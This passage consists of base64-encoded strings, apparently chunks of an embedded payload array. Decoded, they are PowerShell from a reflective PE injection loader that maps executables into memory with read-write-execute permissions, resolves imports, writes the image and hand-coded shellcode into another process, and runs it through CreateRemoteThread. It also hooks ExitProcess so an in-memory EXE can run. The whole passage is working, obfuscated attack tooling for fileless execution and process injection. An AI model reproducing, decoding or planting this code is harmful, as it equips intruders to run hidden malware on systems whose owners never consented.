ZSwgJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCgkJCWlmICgkRWZmZWN0aXZlUEVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQl7CgkJCQlUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MuIElmIHRoZSBQRSBiZWluZyBsb2FkZWQgZG9lc24ndCBzdXBwb3J0IEFTTFIsIGl0IGNvdWxkIGJlIHRoYXQgdGhlIHJlcXVlc3RlZCBiYXNlIGFkZHJlc3Mgb2YgdGhlIFBFIGlzIGFscmVhZHkgaW4gdXNlIgoJCQl9CgkJfQoJCWVsc2UKCQl7CgkJCWlmICgkTlhDb21wYXRpYmxlIC1lcSAkdHJ1ZSkKCQkJewoJCQkJJFBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvYy5JbnZva2UoJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQoJCQl9CgkJCWVsc2UKCQkJewoJCQkJJFBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvYy5JbnZva2UoJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhF",
		"Q1VURV9SRUFEV1JJVEUpCgkJCX0KCQkJJEVmZmVjdGl2ZVBFSGFuZGxlID0gJFBFSGFuZGxlCgkJfQoJCQoJCVtJbnRQdHJdJFBFRW5kQWRkcmVzcyA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5TaXplT2ZJbWFnZSkKCQlpZiAoJFBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQl7IAoJCQlUaHJvdyAiVmlydHVhbEFsbG9jIGZhaWxlZCB0byBhbGxvY2F0ZSBtZW1vcnkgZm9yIFBFLiBJZiBQRSBpcyBub3QgQVNMUiBjb21wYXRpYmxlLCB0cnkgcnVubmluZyB0aGUgc2NyaXB0IGluIGEgbmV3IFBvd2VyU2hlbGwgcHJvY2VzcyAodGhlIG5ldyBQb3dlclNoZWxsIHByb2Nlc3Mgd2lsbCBoYXZlIGEgZGlmZmVyZW50IG1lbW9yeSBsYXlvdXQsIHNvIHRoZSBhZGRyZXNzIHRoZSBQRSB3YW50cyBtaWdodCBiZSBmcmVlKS4iCgkJfQkJCgkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUEVCeXRlcywgMCwgJFBFSGFuZGxlLCAkUEVJbmZvLlNpemVPZkhlYWRlcnMpIHwgT3V0LU51bGwKCQkKCQkKCQkjTm93IHRoYXQgdGhlIFBFIGlzIGluIG1lbW9yeSwgZ2V0IG1vcmUgZGV0YWlsZWQgaW5mb3JtYXRpb24gYWJvdXQgaXQKCQlXcml0ZS1WZXJib3NlICJHZXR0aW5nIGRldGFpbGVkIFBFIGluZm9ybWF0aW9uIGZyb20gdGhlIGhlYWRlcnMgbG9hZGVkIGluIG1lbW9yeSIKCQkkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwoJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFbmRBZGRyZXNzIC1WYWx1ZSAkUEVFbmRBZGRyZXNzCgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEVmZmVjdGl2ZVBFSGFuZGxlIC1WYWx1ZSAkRWZmZWN0aXZlUEVIYW5kbGUKCQlXcml0ZS1WZXJib3NlICJTdGFydEFkZHJlc3M6ICQoR2V0LUhleCAkUEVIYW5kbGUpICAgIEVuZEFkZHJlc3M6ICQoR2V0LUhleCAkUEVFbmRBZGRyZXNzKSIKCQkKCQkKCQkjQ29weSBlYWNoIHNlY3Rpb24gZnJvbSB0aGUgUEUgaW4gdG8gbWVtb3J5CgkJV3JpdGUtVmVyYm9zZSAiQ29weSBQRSBzZWN0aW9ucyBpbiB0byBtZW1vcnkiCgkJQ29weS1TZWN0aW9ucyAtUEVCeXRlcyAkUEVCeXRlcyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcwoJCQoJCQoJCSNVcGRhdGUgdGhlIG1lbW9yeSBhZGRyZXNzZXMgaGFyZGNvZGVkIGluIHRvIHRoZSBQRSBiYXNlZCBvbiB0aGUgbWVtb3J5IGFkZHJlc3MgdGhlIFBFIHdhcyBleHBlY3RpbmcgdG8gYmUgbG9hZGVkIHRvIHZzIHdoZXJlIGl0IHdhcyBhY3R1YWxseSBsb2FkZWQKCQlXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IGFkZHJlc3NlcyBiYXNlZCBvbiB3aGVyZSB0aGUgUEUgd2FzIGFjdHVhbGx5IGxvYWRlZCBpbiBtZW1vcnkiCgkJVXBkYXRlLU1lbW9yeUFkZHJlc3NlcyAtUEVJbmZvICRQRUluZm8gLU9yaWdpbmFsSW1hZ2VCYXNlICRPcmlnaW5hbEltYWdlQmFzZSAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgoJCQoJCSNUaGUgUEUgd2UgYXJlIGluLW1lbW9yeSBsb2FkaW5nIGhhcyBETExzIGl0IG5lZWRzLCBpbXBvcnQgdGhvc2UgRExMcyBmb3IgaXQKCQlXcml0ZS1WZXJib3NlICJJbXBvcnQgRExMJ3MgbmVlZGVkIGJ5IHRoZSBQRSB3ZSBhcmUgbG9hZGluZyIKCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCXsKCQkJSW1wb3J0LURsbEltcG9ydHMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZQoJCX0KCQllbHNlCgkJewoJCQlJbXBvcnQtRGxsSW1wb3J0cyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJfQoJCQoJCQoJCSNVcGRhdGUgdGhlIG1lbW9yeSBwcm90ZWN0aW9uIGZsYWdzIGZvciBhbGwgdGhlIG1lbW9yeSBqdXN0IGFsbG9jYXRlZAoJCWlmICgkUmVtb3RlTG9hZGluZyAtZXEgJGZhbHNlKQoJCXsKCQkJaWYgKCROWENvbXBhdGlibGUgLWVxICR0cnVlKQoJCQl7CgkJCQlXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IHByb3RlY3Rpb24gZmxhZ3MiCgkJCQlVcGRhdGUtTWVtb3J5UHJvdGVjdGlvbkZsYWdzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKCQkJfQoJCQllbHNlCgkJCXsKCQkJCVdyaXRlLVZlcmJvc2UgIlBFIGJlaW5nIHJlZmxlY3RpdmVseSBsb2FkZWQgaXMgbm90IGNvbXBhdGlibGUgd2l0aCBOWCBtZW1vcnksIGtlZXBpbmcgbWVtb3J5IGFzIHJlYWQgd3JpdGUgZXhlY3V0ZSIKCQkJfQoJCX0KCQllbHNlCgkJewoJCQlXcml0ZS1WZXJib3NlICJQRSBiZWluZyBsb2FkZWQgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcywgbm90IGFkanVzdGluZyBtZW1vcnkgcGVybWlzc2lvbnMiCgkJfQoJCQoJCQoJCSNJZiByZW1vdGUgbG9hZGluZywgY29weSB0aGUgRExMIGluIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQoJCWlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCgkJewoJCQlbVUludDMyXSROdW1CeXRlc1dyaXR0ZW4gPSAwCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRFZmZlY3RpdmVQRUhhbmRsZSwgJFBFSGFuZGxlLCBbVUludFB0cl0oJFBFSW5mby5TaXplT2ZJbWFnZSksIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCgkJCX0KCQl9CgkJCgkJCgkJI0NhbGwgdGhlIGVudHJ5IHBvaW50LCBpZiB0aGlzIGlzIGEgRExMIHRoZSBlbnRyeXBvaW50IGlzIHRoZSBEbGxNYWluIGZ1bmN0aW9uLCBpZiBpdCBpcyBhbiBFWEUgaXQgaXMgdGhlIE1haW4gZnVuY3Rpb24KCQlpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKQoJCXsKCQkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZGxsbWFpbiBzbyB0aGUgRExMIGtub3dzIGl0IGhhcyBiZWVuIGxvYWRlZCIKCQkJCSREbGxNYWluUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKCQkJCSREbGxNYWluRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtCb29sXSkKCQkJCSREbGxNYWluID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJERsbE1haW5QdHIsICREbGxNYWluRGVsZWdhdGUpCgkJCQkKCQkJCSREbGxNYWluLkludm9rZSgkUEVJbmZvLlBFSGFuZGxlLCAxLCBbSW50UHRyXTo6WmVybykgfCBPdXQtTnVsbAoJCQl9CgkJCWVsc2UKCQkJewoJCQkJJERsbE1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEVmZmVjdGl2ZVBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpCgkJCQoJCQkJaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCgkJCQl7CgkJCQkJI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCgkJCQkJJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDY2LCAweDgzLCAweGU0LCAweDAwLCAweDQ4LCAweGI5KQoJCQkJCSRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0MSwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHhiOCkKCQkJCQkkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4NDgsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCgkJCQkJJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDg5LCAweGUzLCAweDgzLCAweGU0LCAweGYwLCAweGI5KQoJCQkJCSRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg1MCwgMHg1MiwgMHg1MSwgMHhiOCkKCQkJCQkkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCgkJCQl9CgkJCQkkU0NMZW5ndGggPSAkQ2FsbERsbE1haW5TQzEuTGVuZ3RoICsgJENhbGxEbGxNYWluU0MyLkxlbmd0aCArICRDYWxsRGxsTWFpblNDMy5MZW5ndGggKyAoJFB0clNpemUgKiAyKQoJCQkJJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKQoJCQkJJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCgkJCQkKCQkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MxLkxlbmd0aCkKCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRFZmZlY3RpdmVQRUhhbmRsZSwgJFNDUFNNZW0sICRmYWxzZSkKCQkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQoJCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCgkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzIuTGVuZ3RoKQoJCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJERsbE1haW5QdHIsICRTQ1BTTWVtLCAkZmFsc2UpCgkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKCQkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MzLkxlbmd0aCkKCQkJCQoJCQkJJFJTQ0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSkKCQkJCWlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJCQl7CgkJCQkJVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciBzaGVsbGNvZGUiCgkJCQl9CgkJCQkKCQkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQoJCQkJaWYgKCgkU3VjY2VzcyAtZXEgJGZhbHNlKSAtb3IgKFtVSW50NjRdJE51bUJ5dGVzV3Jp",
		"dHRlbiAtbmUgW1VJbnQ2NF0kU0NMZW5ndGgpKQoJCQkJewoJCQkJCVRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCgkJCQl9CgoJCQkJJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwoJCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCgkJCQlpZiAoJFJlc3VsdCAtbmUgMCkKCQkJCXsKCQkJCQlUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgoJCQkJfQoJCQkJCgkJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAoJCQl9CgkJfQoJCWVsc2VpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJFWEUiKQoJCXsKCQkJI092ZXJ3cml0ZSBHZXRDb21tYW5kTGluZSBhbmQgRXhpdFByb2Nlc3Mgc28gd2UgY2FuIHByb3ZpZGUgb3VyIG93biBhcmd1bWVudHMgdG8gdGhlIEVYRSBhbmQgcHJldmVudCBpdCBmcm9tIGtpbGxpbmcgdGhlIFBTIHByb2Nlc3MKCQkJW0ludFB0cl0kRXhlRG9uZUJ5dGVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoMSkKCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKCRFeGVEb25lQnl0ZVB0ciwgMCwgMHgwMCkKCQkJJE92ZXJ3cml0dGVuTWVtSW5mbyA9IFVwZGF0ZS1FeGVGdW5jdGlvbnMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtRXhlQXJndW1lbnRzICRFeGVBcmdzIC1FeGVEb25lQnl0ZVB0ciAkRXhlRG9uZUJ5dGVQdHIKCgkJCSNJZiB0aGlzIGlzIGFuIEVYRSwgY2FsbCB0aGUgZW50cnkgcG9pbnQgaW4gYSBuZXcgdGhyZWFkLiBXZSBoYXZlIG92ZXJ3cml0dGVuIHRoZSBFeGl0UHJvY2VzcyBmdW5jdGlvbiB0byBpbnN0ZWFkIEV4aXRUaHJlYWQKCQkJIwlUaGlzIHdheSB0aGUgcmVmbGVjdGl2ZWx5IGxvYWRlZCBFWEUgd29uJ3Qga2lsbCB0aGUgcG93ZXJzaGVsbCBwcm9jZXNzIHdoZW4gaXQgZXhpdHMsIGl0IHdpbGwganVzdCBraWxsIGl0cyBvd24gdGhyZWFkLgoJCQlbSW50UHRyXSRFeGVNYWluUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKCQkJV3JpdGUtVmVyYm9zZSAiQ2FsbCBFWEUgTWFpbiBmdW5jdGlvbi4gQWRkcmVzczogJChHZXQtSGV4ICRFeGVNYWluUHRyKS4gQ3JlYXRpbmcgdGhyZWFkIGZvciB0aGUgRVhFIHRvIHJ1biBpbi4iCgoJCQkkV2luMzJGdW5jdGlvbnMuQ3JlYXRlVGhyZWFkLkludm9rZShbSW50UHRyXTo6WmVybywgW0ludFB0cl06Olplcm8sICRFeGVNYWluUHRyLCBbSW50UHRyXTo6WmVybywgKFtVSW50MzJdMCksIFtSZWZdKFtVSW50MzJdMCkpIHwgT3V0LU51bGwKCgkJCXdoaWxlKCR0cnVlKQoJCQl7CgkJCQlbQnl0ZV0kVGhyZWFkRG9uZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRCeXRlKCRFeGVEb25lQnl0ZVB0ciwgMCkKCQkJCWlmICgkVGhyZWFkRG9uZSAtZXEgMSkKCQkJCXsKCQkJCQlDb3B5LUFycmF5T2ZNZW1BZGRyZXNzZXMgLUNvcHlJbmZvICRPdmVyd3JpdHRlbk1lbUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJCQkJV3JpdGUtVmVyYm9zZSAiRVhFIHRocmVhZCBoYXMgY29tcGxldGVkLiIKCQkJCQlicmVhawoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCVN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEKCQkJCX0KCQkJfQoJCX0KCQkKCQlyZXR1cm4gQCgkUEVJbmZvLlBFSGFuZGxlLCAkRWZmZWN0aXZlUEVIYW5kbGUpCgl9CgkKCQoJRnVuY3Rpb24gSW52b2tlLU1lbW9yeUZyZWVMaWJyYXJ5Cgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnk9JHRydWUpXQoJCVtJbnRQdHJdCgkJJFBFSGFuZGxlCgkJKQoJCQoJCSNHZXQgV2luMzIgY29uc3RhbnRzIGFuZCBmdW5jdGlvbnMKCQkkV2luMzJDb25zdGFudHMgPSBHZXQtV2luMzJDb25zdGFudHMKCQkkV2luMzJGdW5jdGlvbnMgPSBHZXQtV2luMzJGdW5jdGlvbnMKCQkkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCgkJCgkJJFBFSW5mbyA9IEdldC1QRURldGFpbGVkSW5mbyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMKCQkKCQkjQ2FsbCBGcmVlTGlicmFyeSBmb3IgYWxsIHRoZSBpbXBvcnRzIG9mIHRoZSBETEwKCQlpZiAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlNpemUgLWd0IDApCgkJewoJCQlbSW50UHRyXSRJbXBvcnREZXNjcmlwdG9yUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5WaXJ0dWFsQWRkcmVzcykKCQkJCgkJCXdoaWxlICgkdHJ1ZSkKCQkJewoJCQkJJEltcG9ydERlc2NyaXB0b3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkSW1wb3J0RGVzY3JpcHRvclB0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpCgkJCQkKCQkJCSNJZiB0aGUgc3RydWN0dXJlIGlzIG51bGwsIGl0IHNpZ25hbHMgdGhhdCB0aGlzIGlzIHRoZSBlbmQgb2YgdGhlIGFycmF5CgkJCQlpZiAoJEltcG9ydERlc2NyaXB0b3IuQ2hhcmFjdGVyaXN0aWNzIC1lcSAwIGAKCQkJCQkJLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5GaXJzdFRodW5rIC1lcSAwIGAKCQkJCQkJLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5Gb3J3YXJkZXJDaGFpbiAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuTmFtZSAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuVGltZURhdGVTdGFtcCAtZXEgMCkKCQkJCXsKCQkJCQlXcml0ZS1WZXJib3NlICJEb25lIHVubG9hZGluZyB0aGUgbGlicmFyaWVzIG5lZWRlZCBieSB0aGUgUEUiCgkJCQkJYnJlYWsKCQkJCX0KCgkJCQkkSW1wb3J0RGxsUGF0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgoQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRJbXBvcnREZXNjcmlwdG9yLk5hbWUpKSkKCQkJCSRJbXBvcnREbGxIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkSW1wb3J0RGxsUGF0aCkKCgkJCQlpZiAoJEltcG9ydERsbEhhbmRsZSAtZXEgJG51bGwpCgkJCQl7CgkJCQkJV3JpdGUtV2FybmluZyAiRXJyb3IgZ2V0dGluZyBETEwgaGFuZGxlIGluIE1lbW9yeUZyZWVMaWJyYXJ5LCBETExOYW1lOiAkSW1wb3J0RGxsUGF0aC4gQ29udGludWluZyBhbnl3YXlzIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQoJCQkJfQoJCQkJCgkJCQkkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5GcmVlTGlicmFyeS5JbnZva2UoJEltcG9ydERsbEhhbmRsZSkKCQkJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQoJCQkJewoJCQkJCVdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBmcmVlIGxpYnJhcnk6ICRJbXBvcnREbGxQYXRoLiBDb250aW51aW5nIGFueXdheXMuIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQoJCQkJfQoJCQkJCgkJCQkkSW1wb3J0RGVzY3JpcHRvclB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkSW1wb3J0RGVzY3JpcHRvclB0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9JTVBPUlRfREVTQ1JJUFRPUikpCgkJCX0KCQl9CgkJCgkJI0NhbGwgRGxsTWFpbiB3aXRoIHByb2Nlc3MgZGV0YWNoCgkJV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBkbGxtYWluIHNvIHRoZSBETEwga25vd3MgaXQgaXMgYmVpbmcgdW5sb2FkZWQiCgkJJERsbE1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5BZGRyZXNzT2ZFbnRyeVBvaW50KQoJCSREbGxNYWluRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtCb29sXSkKCQkkRGxsTWFpbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCREbGxNYWluUHRyLCAkRGxsTWFpbk